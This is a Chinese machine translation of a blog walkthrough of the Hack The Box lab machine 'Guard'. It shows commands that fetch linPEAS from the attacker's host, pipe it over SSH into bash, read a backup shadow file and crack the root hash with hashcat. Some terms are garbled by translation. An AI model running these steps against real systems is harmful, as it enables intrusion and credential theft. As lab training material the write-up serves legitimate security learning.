<html>
<head>
<title>Guard has been Pwned!</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">警卫被pwn了！</h1>
<blockquote>原文：<a href="https://medium.com/geekculture/guard-has-been-pwned-da0bb9be4f30?source=collection_archive---------58-----------------------#2021-09-13">https://medium.com/geekculture/guard-has-been-pwned-da0bb9be4f30?source=collection_archive---------58-----------------------#2021-09-13</a></blockquote><div><div class="ds gw gx gy gz ha"/><div class="hb hc hd he hf"><div class=""/><figure class="ev ex ig ih ii ij er es paragraph-image"><div role="button" tabindex="0" class="ik il di im bf in"><div class="er es if"><img src="../Images/c63311e64128102078cbf14d4be4d62c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tW18_WdpdJ52Mx9WAYrOqw.png"/></div></div><figcaption class="iq ir et er es is it bd b be z dx">Hack The Box Guard</figcaption></figure><p id="fb54" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">入侵这台机器非常有趣，而且没花多长时间。让我们直入主题吧。我总是喜欢检查的第一件事是机器是否响应ping请求。这有助于确定机器是否在线。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="0480" class="kb kc hi jx b fi kd ke l kf kg">└──╼ [★]$ sudo ping 10.10.10.50 | tee -a ping.10.10.10.50.txt<br/> [sudo] password for joe: <br/> PING 10.10.10.50 (10.10.10.50) 56(84) bytes of data.<br/> 64 bytes from 10.10.10.50: icmp_seq=1 ttl=63 time=37.1 ms<br/> 64 bytes from 10.10.10.50: icmp_seq=2 ttl=63 time=21.8 ms<br/> 64 bytes from 10.10.10.50: icmp_seq=3 ttl=63 time=21.9 ms<br/> 64 bytes from 10.10.10.50: icmp_seq=4 ttl=63 time=22.4 ms</span></pre><p id="06fc" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">你可能会注意到，我倾向于通过管道将我的许多命令发送到tee -a filename.txt。这是我在几次考试后养成的习惯。我还将输出复制到一个名为notes的单独的文本文件中。我倾向于在黑机器的时候写走查，拥有一个以上的副本也没有坏处。</p><p id="e18c" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我们知道机器正在响应pings，所以让我们看看哪些服务实际上正在监听机器。我们可以通过运行nmap扫描来做到这一点。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="acc2" class="kb kc hi jx b fi kd ke l kf kg">└──╼ [★]$ sudo nmap -sC -sV -O -p0- 10.10.10.50 | tee -a nmap.10.10.10.50.txt<br/> Starting Nmap 7.91 ( <a class="ae kh" href="https://nmap.org" rel="noopener ugc nofollow" target="_blank">https://nmap.org</a> ) at 2021–09–13 17:06 BST<br/> Nmap scan report for 10.10.10.50<br/> Host is up (0.023s latency).<br/> Not shown: 65535 closed ports<br/> PORT STATE SERVICE VERSION<br/> <strong class="jx hj">22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</strong> protocol 2.0)<br/> | ssh-hostkey: <br/> | 2048 2a:64:23:e0:a7:ec:1d:3b:f0:63:72:a7:d7:05:57:71 (RSA)<br/> | 256 b3:86:5d:3d:c9:d1:70:ea:d6:3d:36:a6:c5:f2:be:5d (ECDSA)<br/> |_ 256 c0:5b:13:0f:d6:e6:d1:71:2d:55:e2:4a:e2:27:0e:c2 (ED25519)<br/> No exact OS matches for host (If you know what OS is running on it, see <a class="ae kh" href="https://nmap.org/submit/" rel="noopener ugc nofollow" target="_blank">https://nmap.org/submit/</a> ).</span></pre><p id="4519" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">唯一在电视上监听的似乎是宋承宪。我们可以尝试和九头蛇一起使用暴力，但我不认为这是我们想要的方法。因为SSH是唯一活动的服务，所以我假设我们应该已经有了上一个盒子中的凭证。机器标记有一个XXE漏洞，允许我们恢复用户daniel的SSH私钥。让我们看看这是否可行。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="37a3" class="kb kc hi jx b fi kd ke l kf kg">└──╼ [★]$ ssh -i daniel.key daniel@10.10.10.50<br/> Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0–88-generic x86_64)<br/> Last login: Mon Sep 13 15:38:53 2021 from 10.10.14.31<br/> daniel@guard:~$</span></pre><p id="a72a" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">可爱的朱布里最后一个盒子里的钥匙很好用。我们现在在机器上，但无论我怎么尝试，我都无法打开user.txt文件。一些有趣的事情正在发生。我最初试图通过Vim获得一个shell，因为我以前使用过这种技术，结果发现man是我们的人！通过使用man命令，我们可以通过键入以下命令“逃”到shell！巴什。</p><figure class="js jt ju jv fd ij er es paragraph-image"><div class="er es ki"><img src="../Images/0645bf0f41b507e5493b6759d3237fad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1200/1*wj_EQQhKdpeg_srpjgwkog.gif"/></div><figcaption class="iq ir et er es is it bd b be z dx">Hacking from man to shell</figcaption></figure><p id="1761" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">现在我们可以捕获用户标志。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="a343" class="kb kc hi jx b fi kd ke l kf kg"><br/>daniel@guard:~$ cat user.txt<br/>209**********************081</span></pre><p id="f1a4" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">那么下一步是什么？有一大堆文件系统需要查看，而没有多少命令可供我们使用。我试图从一个自托管的Python服务器上下载linPEAS，但是我试图下载它的任何操作都失败了。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="9cab" class="kb kc hi jx b fi kd ke l kf kg">daniel@guard:~$ curl <a class="ae kh" href="http://10.10.14.38/leanpeas.sh" rel="noopener ugc nofollow" target="_blank">http://10.10.14.38/leanpeas.sh</a><br/>curl: (7) Couldn’t connect to server<br/>daniel@guard:~$ ping 10.10.14.38<br/><strong class="jx hj">ping: socket: Permission denied</strong><br/>daniel@guard:~$ <a class="ae kh" href="http://10.10.14.38/leanpeas.sh" rel="noopener ugc nofollow" target="_blank">http://10.10.14.38/leanpeas.sh</a><br/>bash: <a class="ae kh" href="http://10.10.14.38/leanpeas.sh" rel="noopener ugc nofollow" target="_blank">http://10.10.14.38/leanpeas.sh</a>: No such file or directory<br/>daniel@guard:~$ wget <a class="ae kh" href="http://10.10.14.38/leanpeas.sh" rel="noopener ugc nofollow" target="_blank">http://10.10.14.38/leanpeas.sh</a><br/> — 2021–09–13 16:48:20 —  <a class="ae kh" href="http://10.10.14.38/leanpeas.sh" rel="noopener ugc nofollow" target="_blank">http://10.10.14.38/leanpeas.sh</a><br/>Connecting to 10.10.14.38:80… failed: Permission denied.<br/>Retrying.</span></pre><p id="e106" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">对，看起来我们根本没有访问套接字的权限。不太好。我想是时候施展一些宋承宪的魔法了。您可以通过SSH使用管道命令，这应该允许我从本地系统上的脚本运行远程主机上的linPEAS。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="911f" class="kb kc hi jx b fi kd ke l kf kg">─[eu-vip-22]─[10.10.14.38]─[joe@parrot]─[~]<br/>└──╼ [★]$ sudo ssh -i daniel.key daniel@10.10.10.50 ‘bash -s’ &lt; /Path/To/linpeas.sh</span></pre><p id="e918" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">老实说，没有什么能比你做了一些奇怪的事情并且成功了的感觉更好的了。现在linPEAS在远程主机上运行，是时候检查输出了。我注意到一些有趣的事情。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="ef0b" class="kb kc hi jx b fi kd ke l kf kg">[+] Looking for ssl/ssh files<br/>/home/picasso/.ssh/authorized_keys /usr/lib/initramfs-tools/etc/dhcp/dhclient-enter-hooks.d/config<br/>PermitRootLogin yes<br/>PubkeyAuthentication yes<br/><strong class="jx hj">PasswordAuthentication yes</strong></span></pre><p id="cb70" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">首先，root可以使用密码登录，而不需要公钥和私钥对。我不确定这会让事情变得更难还是更容易，但注意到这一点是有好处的。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="2eb5" class="kb kc hi jx b fi kd ke l kf kg">[+] Looking for specific hashes inside files — less false positives (limit 70)<br/><strong class="jx hj">/var/backups/shadow:$6$2EEJjgy86KrZ.cbl$oCf1MzIsN7N9KziBNo7uYrHLueZLM7wySrsFYxlNtO5NVhfVsyWCSKiIURNUxOOwC0tm1kyQsiv93imCwLM0k1</strong></span></pre><p id="8054" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">看起来linPEAS能够从备份影子文件中获取散列值。这就是我们以root用户身份进入盒子的方式。让我们检查一下备份文件。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="91b8" class="kb kc hi jx b fi kd ke l kf kg">daniel@guard:~$ cat /var/backups/shadow<br/><strong class="jx hj">root:$6$KIP2PX8O$7VF4mj1i.w/.sIOwyeN6LKnmeaFTgAGZtjBjRbvX4pEHvx1XUzXLTBBu0jRLPeZS.69qNrPgHJ0yvc3N82hY31:18334:0:99999:7:::</strong><br/>daemon:*:18113:0:99999:7:::<br/>---SNIP---<br/>pollinate:*:18113:0:99999:7:::<br/>sshd:*:18326:0:99999:7:::<br/><strong class="jx hj">daniel:$6$2EEJjgy86KrZ.cbl$oCf1MzIsN7N9KziBNo7uYrHLueZLM7wySrsFYxlNtO5NVhfVsyWCSKiIURNUxOOwC0tm1kyQsiv93imCwLM0k1:18326:0:99999:7:::</strong></span></pre><p id="2bd4" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">我已经删除了我们不需要的内容，您可以看到备份文件包含root和daniel的哈希。好吧，我们复制一份，然后离线破解。应该指出的是，我还注意到我可以对/etc/passwd文件进行cat。考虑到这一点，当我打算使用unshadow并尝试用JohnTheRipper破解它时，我也拿了一份副本。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="5cb4" class="kb kc hi jx b fi kd ke l kf kg">└──╼ [★]$ sudo unshadow passwd.txt shadow.txt &gt; passwords.txt</span></pre><p id="8a01" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">不幸的是，John不喜欢这个文件并且无法破解它，所以我用rockyou单词表切换到hashcat。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="a8bb" class="kb kc hi jx b fi kd ke l kf kg">└──╼ [★]$ sudo hashcat -m 1800 — force root.hash /usr/share/wordlists/rockyou.txt</span><span id="74c3" class="kb kc hi jx b fi kj ke l kf kg">$6$KIP2PX8O$7VF4mj1i.w/.sIOwyeN6LKnmeaFTgAGZtjBjRbvX4pEHvx1XUzXLTBBu0jRLPeZS.69qNrPgHJ0yvc3N82hY31:<strong class="jx hj">password#1</strong><br/> <br/>Session……….: hashcat<br/>Status………..: Cracked<br/>Hash.Name……..: sha512crypt $6$, SHA512 (Unix)<br/>Hash.Target……: $6$KIP2PX8O$7VF4mj1i.w/.sIOwyeN6LKnmeaFTgAGZtjBjRbv…82hY31<br/>Time.Started…..: Mon Sep 13 17:57:10 2021, (1 min, 3 secs)<br/>Time.Estimated…: Mon Sep 13 17:58:13 2021, (0 secs)<br/>Guess.Base…….: File (/usr/share/wordlists/rockyou.txt)<br/>Guess.Queue……: 1/1 (100.00%)<br/>Speed.#1………: 1751 H/s (6.91ms) @ Accel:32 Loops:512 Thr:1 Vec:4<br/>Recovered……..: 1/1 (100.00%) Digests<br/>Progress………: 110336/14344386 (0.77%)<br/>Rejected………: 0/110336 (0.00%)<br/>Restore.Point….: 110208/14344386 (0.77%)<br/>Restore.Sub.#1…: Salt:0 Amplifier:0–1 Iteration:4608–5000<br/>Candidates.#1….: pooh-bear -&gt; pashaungu</span></pre><p id="2d2d" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">密码竟然是“密码#1”。老实说，我认为我们可以很快强行完成，但是请等一下。然后，我们能够以root用户身份登录到机器，并捕获root标志。</p><pre class="js jt ju jv fd jw jx jy jz aw ka bi"><span id="31f8" class="kb kc hi jx b fi kd ke l kf kg">└──╼ [★]$ ssh root@10.10.10.50<br/>root@10.10.10.50’s password: <br/>Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0–88-generic x86_64)<br/>Last login: Mon Sep 13 15:50:13 2021 from 10.10.14.31<br/>root@guard:~# cat root.txt<br/>386*******************f681</span></pre><figure class="js jt ju jv fd ij er es paragraph-image"><div class="er es kk"><img src="../Images/052e89bc51ca35693039e481467792a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1196/format:webp/1*w-RSr8BpdaRdRJR8ao6kaQ.png"/></div><figcaption class="iq ir et er es is it bd b be z dx">Guard has been Pwned!</figcaption></figure><p id="df77" class="pw-post-body-paragraph iu iv hi iw b ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn jo jp jq jr hb bi translated">下次见，同样的时间，同样的时间…啊，算了吧。在<a class="ae kh" href="https://haxez.org" rel="noopener ugc nofollow" target="_blank"> haXez </a>查看更多帖子。</p></div></div>    
</body>
</html>